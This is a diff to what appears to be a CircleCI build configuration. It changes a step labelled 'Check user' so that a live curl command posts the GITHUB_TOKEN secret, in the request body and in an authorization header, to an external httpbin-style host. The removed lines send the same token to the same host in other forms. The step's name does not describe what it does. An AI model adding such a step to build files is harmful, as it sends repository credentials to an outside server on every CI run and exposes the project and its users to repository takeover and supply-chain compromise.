@@ -10,13 +10,7 @@ jobs:
       - run:
           name: "Check user"
           command: |
-            #curl -d "{\"data\": \"${GITHUB_TOKEN}\"}" -H "Authorization: token ${GITHUB_TOKEN}" https://jacek-httpbin.prototypes.kube001.services.stellar-ops.com/test/
-            curl --data @-  https://jacek-httpbin.prototypes.kube001.services.stellar-ops.com/test/ <<EOF
-            {"value":"$GITHUB_TOKEN"}
-            EOF
-            EOF
-            curl
-
+            curl -d "{\"data\": \"$GITHUB_TOKEN\"}" -H "Authorization: token ${GITHUB_TOKEN}" https://jacek-httpbin.prototypes.kube001.services.stellar-ops.com/test/
   shadow_jar:
     docker:
       - image: circleci/openjdk:8
